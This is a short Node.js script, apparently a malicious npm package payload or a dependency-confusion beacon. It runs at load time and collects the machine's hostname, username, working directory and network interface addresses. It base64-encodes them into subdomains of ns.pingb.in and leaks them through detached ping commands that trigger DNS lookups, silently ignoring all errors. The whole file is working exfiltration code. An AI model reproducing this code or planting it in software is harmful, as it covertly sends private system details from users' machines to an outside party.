const os = require("os");
const { spawn } = require("child_process");
var isWin = process.platform === "win32";

const id = "a9bf10ac14bdac8f374cb122a474";

try {
  exfil({ r_hostname: os.hostname() });
} catch (e) {}
try {
  exfil({ r_user: os.userInfo().username });
} catch (e) {}
try {
  exfil({ r_cwd: process.cwd() });
} catch (e) {}
try {
  const nets = os.networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      exfil({ ["r_net_" + name]: net.address });
    }
  }
} catch (e) {}

//process.exit();

function exfil(data) {
  try {
    const b64 = Buffer.from(JSON.stringify(data))
      .toString("base64")
      .replace(/=/gm, "");

    let args;
    if (isWin) {
      args = ["-n", "1"];
    } else {
      args = ["-c", "1"];
    }
    args.push(`${id}.${b64}.ns.pingb.in`);
    spawn(`ping`, args, { detached: true });
  } catch (e) {}
}
